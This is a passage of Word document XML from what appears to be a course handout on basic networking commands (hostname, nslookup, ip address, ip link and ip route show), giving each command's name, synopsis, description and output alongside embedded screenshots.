            <wp:effectExtent l="0" t="0" r="2540" b="3810"/>
            <wp:docPr id="113077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2"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="2415540"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="31DB1299" w14:textId="77777777" w:rsidR="00266E8F" w:rsidRPr="00266E8F" w:rsidRDefault="00266E8F" w:rsidP="00266E8F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00266E8F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>8. hostname</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C655205" w14:textId="77777777" w:rsidR="00266E8F" w:rsidRPr="00266E8F" w:rsidRDefault="00266E8F" w:rsidP="00266E8F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00266E8F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>NAME:</w:t>
      </w:r>
      <w:r w:rsidRPr="00266E8F">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> hostname - displays the computer name.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16086CE0" w14:textId="77777777" w:rsidR="00266E8F" w:rsidRPr="00266E8F" w:rsidRDefault="00266E8F" w:rsidP="00266E8F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00266E8F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>SYNOPSIS:</w:t>
      </w:r>
      <w:r w:rsidRPr="00266E8F">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> hostname</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C4585CB" w14:textId="77777777" w:rsidR="00266E8F" w:rsidRPr="00266E8F" w:rsidRDefault="00266E8F" w:rsidP="00266E8F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00266E8F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DESCRIPTION:</w:t>
      </w:r>
      <w:r w:rsidRPr="00266E8F">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays the name assigned to the local computer on the network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="722AB454" w14:textId="77777777" w:rsidR="00266E8F" w:rsidRPr="00266E8F" w:rsidRDefault="00266E8F" w:rsidP="00266E8F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00266E8F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>OUTPUT:</w:t>
      </w:r>
      <w:r w:rsidRPr="00266E8F">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays the computer's host name.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B54F6D2" w14:textId="4B65648C" w:rsidR="00266E8F" w:rsidRDefault="00B86C1D" w:rsidP="00266E8F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0BCF2CE6" wp14:editId="25FA2575">
            <wp:extent cx="2305050" cy="542925"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="69113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3"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2305050" cy="542925"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="73BCDF87" w14:textId="77777777" w:rsidR="003C36F1" w:rsidRPr="003C36F1" w:rsidRDefault="003C36F1" w:rsidP="003C36F1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003C36F1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>9. nslookup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FD8339B" w14:textId="77777777" w:rsidR="003C36F1" w:rsidRPr="003C36F1" w:rsidRDefault="003C36F1" w:rsidP="003C36F1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003C36F1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>NAME:</w:t>
      </w:r>
      <w:r w:rsidRPr="003C36F1">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> nslookup - retrieves DNS information for a domain.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14409B00" w14:textId="77777777" w:rsidR="003C36F1" w:rsidRPr="003C36F1" w:rsidRDefault="003C36F1" w:rsidP="003C36F1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003C36F1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>SYNOPSIS:</w:t>
      </w:r>
      <w:r w:rsidRPr="003C36F1">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> nslookup &lt;domain&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D8712BD" w14:textId="77777777" w:rsidR="003C36F1" w:rsidRPr="003C36F1" w:rsidRDefault="003C36F1" w:rsidP="003C36F1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003C36F1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DESCRIPTION:</w:t>
      </w:r>
      <w:r w:rsidRPr="003C36F1">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Queries the Domain Name System (DNS) to retrieve information about a specified domain name or IP address.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11E697EE" w14:textId="77777777" w:rsidR="003C36F1" w:rsidRPr="003C36F1" w:rsidRDefault="003C36F1" w:rsidP="003C36F1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003C36F1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>OUTPUT:</w:t>
      </w:r>
      <w:r w:rsidRPr="003C36F1">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays the DNS server used and the corresponding DNS query results.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55C5482B" w14:textId="06923BC1" w:rsidR="00C753D2" w:rsidRDefault="00C753D2" w:rsidP="00FB5316">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="16A94E41" wp14:editId="782BC9C9">
            <wp:extent cx="3667125" cy="1666875"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:docPr id="355955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4"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3667125" cy="1666875"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CDF0A23" w14:textId="77777777" w:rsidR="00FB5316" w:rsidRDefault="00FB5316" w:rsidP="00FB5316">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A4D1C34" w14:textId="77777777" w:rsidR="00FB5316" w:rsidRDefault="00FB5316" w:rsidP="00FB5316">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43E21897" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00FB5316">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="774E4767" w14:textId="53D63697" w:rsidR="00C71EB5" w:rsidRDefault="00FB5316" w:rsidP="00812B48">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Linux Networking Command</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F586066" w14:textId="5AB54614" w:rsidR="00421555" w:rsidRPr="00421555" w:rsidRDefault="00421555" w:rsidP="00421555">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00421555">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>10. ip address show (ip a)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C771960" w14:textId="77777777" w:rsidR="00421555" w:rsidRPr="00421555" w:rsidRDefault="00421555" w:rsidP="00421555">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00421555">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>NAME:</w:t>
      </w:r>
      <w:r w:rsidRPr="00421555">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> ip address show - displays IP address configuration.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50153611" w14:textId="77777777" w:rsidR="00421555" w:rsidRPr="00421555" w:rsidRDefault="00421555" w:rsidP="00421555">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00421555">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>SYNOPSIS:</w:t>
      </w:r>
      <w:r w:rsidRPr="00421555">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> ip address show or ip a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58C7FADF" w14:textId="77777777" w:rsidR="00421555" w:rsidRPr="00421555" w:rsidRDefault="00421555" w:rsidP="00421555">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00421555">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DESCRIPTION:</w:t>
      </w:r>
      <w:r w:rsidRPr="00421555">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays the IP addresses assigned to the network interfaces of the Linux system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AF02EE8" w14:textId="77777777" w:rsidR="00421555" w:rsidRDefault="00421555" w:rsidP="00421555">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00421555">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>OUTPUT:</w:t>
      </w:r>
      <w:r w:rsidRPr="00421555">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays network interface names, IP addresses, and related address information.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA51897" w14:textId="0EA05F38" w:rsidR="00421555" w:rsidRDefault="00DD5E6B" w:rsidP="00421555">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="39719A98" wp14:editId="56449C59">
            <wp:extent cx="5731510" cy="1859280"/>
            <wp:effectExtent l="0" t="0" r="2540" b="7620"/>
            <wp:docPr id="969284779" name="Picture 9692847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5"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="1859280"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FC098DE" w14:textId="77777777" w:rsidR="00C71EB5" w:rsidRDefault="00C71EB5" w:rsidP="003B52FB">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C6AC83D" w14:textId="5A105603" w:rsidR="003B52FB" w:rsidRPr="003B52FB" w:rsidRDefault="003B52FB" w:rsidP="003B52FB">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003B52FB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>11. ip link show</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="779094D6" w14:textId="77777777" w:rsidR="003B52FB" w:rsidRPr="003B52FB" w:rsidRDefault="003B52FB" w:rsidP="003B52FB">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003B52FB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>NAME:</w:t>
      </w:r>
      <w:r w:rsidRPr="003B52FB">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> ip link show - displays network interfaces.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00AADD4B" w14:textId="77777777" w:rsidR="003B52FB" w:rsidRPr="003B52FB" w:rsidRDefault="003B52FB" w:rsidP="003B52FB">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003B52FB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>SYNOPSIS:</w:t>
      </w:r>
      <w:r w:rsidRPr="003B52FB">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> ip link show</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35F829FD" w14:textId="77777777" w:rsidR="003B52FB" w:rsidRPr="003B52FB" w:rsidRDefault="003B52FB" w:rsidP="003B52FB">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003B52FB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DESCRIPTION:</w:t>
      </w:r>
      <w:r w:rsidRPr="003B52FB">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays information about network interfaces, including their names, MAC addresses, and operational states.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C6F9B0B" w14:textId="77777777" w:rsidR="003B52FB" w:rsidRPr="003B52FB" w:rsidRDefault="003B52FB" w:rsidP="003B52FB">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003B52FB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>OUTPUT:</w:t>
      </w:r>
      <w:r w:rsidRPr="003B52FB">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays the available network interfaces and their status.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23B9E891" w14:textId="2D8AE148" w:rsidR="00DD5E6B" w:rsidRDefault="00E760F0" w:rsidP="00421555">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="43F1615F" wp14:editId="1E3147AA">
            <wp:extent cx="5731510" cy="586105"/>
            <wp:effectExtent l="0" t="0" r="2540" b="4445"/>
            <wp:docPr id="613187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6"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="586105"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A07F7CA" w14:textId="77777777" w:rsidR="00C71EB5" w:rsidRDefault="00C71EB5" w:rsidP="00E760F0">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75C869FF" w14:textId="77777777" w:rsidR="00C71EB5" w:rsidRDefault="00C71EB5" w:rsidP="00E760F0">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5AD9993D" w14:textId="77777777" w:rsidR="00C71EB5" w:rsidRDefault="00C71EB5" w:rsidP="00E760F0">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57445BE7" w14:textId="77777777" w:rsidR="00C71EB5" w:rsidRDefault="00C71EB5" w:rsidP="00E760F0">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BCC4587" w14:textId="77777777" w:rsidR="00C71EB5" w:rsidRDefault="00C71EB5" w:rsidP="00E760F0">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C341A09" w14:textId="7486A09B" w:rsidR="00E760F0" w:rsidRPr="00E760F0" w:rsidRDefault="00E760F0" w:rsidP="00E760F0">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E760F0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>12. ip route show</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35D78E68" w14:textId="77777777" w:rsidR="00E760F0" w:rsidRPr="00E760F0" w:rsidRDefault="00E760F0" w:rsidP="00E760F0">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E760F0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>NAME:</w:t>
      </w:r>
      <w:r w:rsidRPr="00E760F0">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> ip route show - displays the routing table.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="297EFC08" w14:textId="77777777" w:rsidR="00E760F0" w:rsidRPr="00E760F0" w:rsidRDefault="00E760F0" w:rsidP="00E760F0">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E760F0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>SYNOPSIS:</w:t>
      </w:r>
      <w:r w:rsidRPr="00E760F0">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> ip route show</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="079786FE" w14:textId="77777777" w:rsidR="00E760F0" w:rsidRPr="00E760F0" w:rsidRDefault="00E760F0" w:rsidP="00E760F0">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E760F0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DESCRIPTION:</w:t>
      </w:r>
      <w:r w:rsidRPr="00E760F0">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays the IPv4 routing table used by the Linux system to forward network packets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B2267B5" w14:textId="77777777" w:rsidR="00E760F0" w:rsidRPr="00E760F0" w:rsidRDefault="00E760F0" w:rsidP="00E760F0">
      <w:pPr>
